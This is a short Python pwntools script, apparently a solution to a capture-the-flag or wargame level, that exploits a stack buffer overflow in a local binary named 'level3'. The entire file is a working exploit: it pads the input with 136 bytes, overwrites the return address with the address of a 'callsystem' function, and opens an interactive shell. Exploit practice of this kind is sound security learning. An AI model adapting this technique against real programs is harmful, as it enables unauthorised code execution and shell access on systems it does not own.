#!/usr/bin/python
from pwn import * 
p = process('./level3')
elf = ELF('./level3')

system_addr = elf.functions['callsystem'].address

payload = "A" * 136 + p64(system_addr)

p.send(payload)

p.interactive()

